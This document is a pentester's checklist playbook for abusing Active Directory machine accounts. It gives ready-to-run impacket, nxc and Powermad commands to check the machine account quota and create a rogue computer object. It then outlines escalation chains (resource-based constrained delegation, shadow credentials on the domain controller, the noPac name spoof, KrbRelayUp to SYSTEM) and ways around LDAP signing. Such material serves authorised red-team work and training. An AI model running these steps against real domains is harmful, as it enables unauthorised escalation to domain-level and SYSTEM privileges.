# Machine Account Abuse

## Before I start
- [ ] Any domain credential — no privileges needed
- [ ] MAQ checked: nxc ldap <DCIP> -u '<User>' -p '<Password>' -M maq

## Create a computer object (MAQ > 0)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass '<NewPass>' -dc-ip <DCIP> '<Domain>/<User>:<Password>'
nxc ldap <DCIP> -u '<User>' -p '<Password>' -M add-computer -o NAME=FAKE01
- [ ] Windows: Powermad New-MachineAccount -MachineAccount FAKE01
- [ ] Creator keeps write perms on the object — I can now shadow-cred it, set its SPNs, delegate through it

## Plays with my machine account
- [ ] RBCD: delegate FAKE01$ to a host I have GenericWrite on → S4U2Self admin ticket: :Pb delegation
- [ ] Shadow creds the DC$ via relay + LDAP write: :Pb shadow-credentials
- [ ] sAMAccountName spoof (noPac, pre-Nov-2021 DCs): rename to DC name minus $, request TGT, rename back, S4U = DC ticket
- [ ] KrbRelayUp (unpatched 2022 builds): local relay → create machine → RBCD → SYSTEM

## If it fails
- [ ] MAQ = 0 → can't create; hunt an existing unused computer account or ask why BloodHound shows computer writes
- [ ] LDAP signing/channel binding blocks creation → use -use-ldaps / Kerberos auth
- [ ] noPac patched everywhere modern — check DC build before spending time

## Clean up
impacket-addcomputer -computer-name 'FAKE01$' -dc-ip <DCIP> -delete '<Domain>/<User>:<Password>'

## Next
- [ ] Machine account in hand → the delegation and relay chains: :Pb delegation, :Pb ntlm-relay
- [ ] Re-enum with the new account's view: :Pb domain-enum
